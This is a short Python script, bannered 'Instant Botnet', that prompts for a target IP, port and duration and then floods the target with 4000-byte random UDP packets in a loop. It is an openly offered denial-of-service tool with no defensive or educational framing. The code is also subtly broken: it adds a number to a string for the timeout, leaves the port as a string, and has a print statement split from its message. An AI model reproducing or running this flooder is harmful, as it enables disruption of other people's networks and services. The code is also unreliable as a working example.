import os
import sys
import time
import socket
import random


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(4000)

os.system("clear")
print(""" /$$$$$$                       /$$                           /$$           /$$$$$$$              /$$                           /$$    
|_  $$_/                      | $$                          | $$          | $$__  $$            | $$                          | $$    
  | $$   /$$$$$$$   /$$$$$$$ /$$$$$$    /$$$$$$  /$$$$$$$  /$$$$$$        | $$  \ $$  /$$$$$$  /$$$$$$   /$$$$$$$   /$$$$$$  /$$$$$$  
  | $$  | $$__  $$ /$$_____/|_  $$_/   |____  $$| $$__  $$|_  $$_/        | $$$$$$$  /$$__  $$|_  $$_/  | $$__  $$ /$$__  $$|_  $$_/  
  | $$  | $$  \ $$|  $$$$$$   | $$      /$$$$$$$| $$  \ $$  | $$          | $$__  $$| $$  \ $$  | $$    | $$  \ $$| $$$$$$$$  | $$    
  | $$  | $$  | $$ \____  $$  | $$ /$$ /$$__  $$| $$  | $$  | $$ /$$      | $$  \ $$| $$  | $$  | $$ /$$| $$  | $$| $$_____/  | $$ /$$
 /$$$$$$| $$  | $$ /$$$$$$$/  |  $$$$/|  $$$$$$$| $$  | $$  |  $$$$/      | $$$$$$$/|  $$$$$$/  |  $$$$/| $$  | $$|  $$$$$$$  |  $$$$/
|______/|__/  |__/|_______/    \___/   \_______/|__/  |__/   \___/        |_______/  \______/    \___/  |__/  |__/ \_______/   \___/  """)

ip = input("Ip Adress: ")
port = input("Port: ")
times = input("Time: ")
timeout = time.time() + times
sent = 0

while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        print
        "Sent %s packets to %s through port %s" % (sent, ip, port)
    except KeyboardInterrupt:
        sys.exit()
